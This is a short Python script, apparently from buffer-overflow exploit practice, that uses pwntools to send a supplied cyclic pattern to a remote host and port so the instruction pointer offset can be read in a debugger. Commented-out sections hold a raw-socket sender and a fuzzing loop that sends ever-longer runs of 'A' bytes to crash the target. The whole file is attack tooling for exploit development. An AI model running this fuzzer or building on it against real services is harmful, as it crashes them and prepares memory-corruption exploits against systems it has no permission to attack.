#!/usr/bin/python3
import socket
import sys
import time
from pwn import *




if len(sys.argv) < 4:
	print("\nUsage: " + sys.argv[0] + " <HOST> <PORT> $(pattern_offset -l <LENGTH NEEDED>) \n")
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]
data = sys.argv[3]

p = remote(host, port)
p.sendline(data)
print("Sent evil buffer >:) Check your debugger for the EIP")




'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.recv(1024)
s.send(data.encode('utf-8'))
s.close()
print("Evil Buffer sent >:)")
'''




'''
while (length < 10000): #continue to send data until bytes == 10000
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port)))
	s.recv(1024)
	s.send(b"A" * length)
	s.recv(1024)
	s.close()
	time.sleep(2)
	print("Buffer sent: " + str(length))
	length += 100

'''
